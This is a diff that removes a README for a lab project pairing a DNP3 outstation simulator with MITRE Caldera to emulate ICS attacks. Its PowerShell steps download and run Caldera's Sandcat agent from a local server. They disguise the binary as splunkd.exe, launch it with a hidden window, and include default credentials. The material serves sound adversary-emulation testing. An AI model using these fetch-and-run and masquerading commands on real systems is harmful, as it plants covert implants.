@ -1,176 +0,0 @@
# DNP3 Outstation Simulator & Caldera Integration
A DNP3-based ICS simulation for cybersecurity testing with MITRE Caldera.
## Description
This project provides a lightweight DNP3 outstation simulator and an operator-side Caldera setup, enabling realistic ICS control emulation without any physical hardware.

## Getting Started

### Dependencies

* Python3 (Works best with Python 3.10.12)
* Should work on Ubuntu or WSL
* MITRE Caldera with DNP3 plugin
  * [Caldera installation instructions](https://github.com/mitre/caldera?tab=readme-ov-file#requirements)
  * [DNP3 Plugin Installation instructions](https://github.com/mitre/dnp3)


### Installation
1. Install & Start MITRE Caldera
Clone or navigate to your Caldera installation:
```
cd caldera
pip3 install -r requirements.txt
python3 server.py --insecure --build
```

Caldera will start on:
http://127.0.0.1:8888

Username: red

Password: admin

2. Set Up the Sandcat Agent (Windows)
Open a PowerShell terminal as Administrator and run:
```$server="http://127.0.0.1:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
```

### Kill any old splunkd instance
```
get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;
```

### Remove previous file if it exists
```
rm -force "C:\Users\Public\splunkd.exe" -ea ignore;
```

### Write the new Sandcat binary
```
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
```

### Start the agent
```
Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
```
After a few seconds, the Sandcat agent should appear in Caldera under:
Agents

3. Install Python Virtual Environment for Outstation
```
python3.10 -m venv ~/venv310
source ~/venv310/bin/activate
```
Confirm you are running Python 3.10:
```
python3 --version
```


4. Run the DNP3 Outstation Simulator
Navigate to your simulator directory:
```
cd ~/dnp3sim
python3 outstation_bridge.py
```
This will:

Start the simulated DNP3 outstation
Expose the DNP3 TCP endpoint (usually port 20000)
Log incoming master commands (including from Caldera)



## Usage
### Step 1: Start the DNP3 Outstation by running this command in your outstation directory
```
python3 outstation_bridge.py
```
If it starts correctly, you will see terminal output showing:



### Step 2: Start Caldera (if not already running)
In a separate terminal:

```
cd caldera
python3 server.py --insecure --build
```

### Step 3: Connect the Sandcat Agent
If not already connected, repeat the PowerShell Sandcat setup.
Once connected, Caldera can send DNP3-related commands via your abilities.

### Step 4: Run an Operation in Caldera

Go to Operations â†’ New Operation
Give the operation a name (e.g. DNP3 Control Test)
Press the add potential link button|
Make sure the Executor is on psh (powershell)
Type in DNP3 in the search to view all possible DNP3 commands from the DNP3 Plugin we installed earlier.

Choose any DNP3-related Fact Sources (if present)
Start the operation



### Step 5: Execute DNP3 Abilities

Your abilities may include:

Read Binary Inputs
Read Analog Inputs
Control Relay Output Blocks
Operate DNP3 Select/Operate

Custom abilities you create yourself

Example: 

### Step 6: Analyze Traffic with Wireshark
To capture loopback traffic:


Use Npcap with "Support Loopback" enabled


In Wireshark, select the Npcap Loopback Adapter


Filter examples:
DNP3 filter
dnp3

TCP port filter (default DNP3 port)
tcp.port == 20000

You should now see:
SELECT / OPERATE messages
Responses from your simulator
Traffic generated by Caldera abilities



### Help & Troubleshooting
If the Sandcat fails to launch:
Ensure antivirus hasn't quarantined splunkd.exe
Delete + re-fetch the Sandcat binary
If outstation does not respond:
Confirm it's bound to 127.0.0.1:20000


Ensure no other process is using the port:
lsof -i :20000
If Wireshark shows no traffic:
Ensure loopback capture is enabled


Try filtering with:
tcp
